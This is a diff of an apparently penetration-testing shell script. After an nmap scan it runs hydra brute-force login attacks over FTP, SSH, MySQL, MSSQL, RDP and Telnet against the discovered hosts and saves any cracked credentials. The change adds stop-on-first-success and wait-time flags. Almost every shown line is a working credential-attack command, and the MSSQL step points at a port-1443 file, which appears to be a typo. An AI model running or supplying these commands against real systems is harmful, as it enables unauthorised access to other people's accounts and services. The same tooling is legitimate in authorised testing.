@@ -93,12 +93,12 @@ zenmap $SCAN_RESULTS_LOCATION/nmap_results/$NETWORK.xml &
 cd $HOME
 #Brute Force attacks
 #mkdir -p $SCAN_RESULTS_LOCATION/bruteforced_creds
-hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/21-TCP.txt ftp -t1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/ftp.txt
-hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/22-TCP.txt ssh -t1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/ssh.txt
-hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/3306-TCP.txt mysql -t1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/mysql.txt
-hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/1443-TCP.txt mssql -t1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/mssql.txt
-hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/3389-TCP.txt rdp -t1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/rdp.txt
-hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/23-TCP.txt telnet -t1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/telnet.txt
+hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/22-TCP.txt ssh -f -t1 -W 1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/ssh.txt
+hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/3306-TCP.txt mysql -f -t1 -W 1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/mysql.txt
+hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/1443-TCP.txt mssql -f -t1 -W 1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/mssql.txt
+hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/21-TCP.txt ftp -f -t1 -W 1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/ftp.txt
+hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/3389-TCP.txt rdp -f -t1 -W 1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/rdp.txt
+hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/23-TCP.txt telnet -f -t1 -W 1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/telnet.txt
 
 #Open results in IceWeasel
 firefox &
